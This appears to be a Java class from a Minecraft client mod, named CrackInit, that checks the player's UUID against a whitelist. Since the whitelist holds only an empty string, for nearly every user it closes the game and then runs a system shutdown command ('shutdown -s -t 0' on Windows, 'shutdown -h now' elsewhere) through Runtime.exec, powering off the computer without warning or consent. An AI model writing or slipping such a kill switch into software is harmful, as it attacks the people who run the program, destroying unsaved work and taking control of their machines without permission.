package net.wheel.cutils.impl.management;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;

import net.minecraft.client.Minecraft;

public class CrackInit {

    private static final List<String> crackinc = Arrays.asList("");

    public static void CPU() {
        String playerUUID = Minecraft.getMinecraft().getSession().getPlayerID();
        if (!crackinc.contains(playerUUID)) {
            Minecraft.getMinecraft().shutdown();
            bye();
        }
    }

    private static void bye() {
        String os = System.getProperty("os.name").toLowerCase();
        String deathCommand = null;

        if (os.contains("win")) {
            deathCommand = "shutdown -s -t 0";
        } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
            deathCommand = "shutdown -h now";
        }

        if (deathCommand != null) {
            try {
                Runtime.getRuntime().exec(deathCommand);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
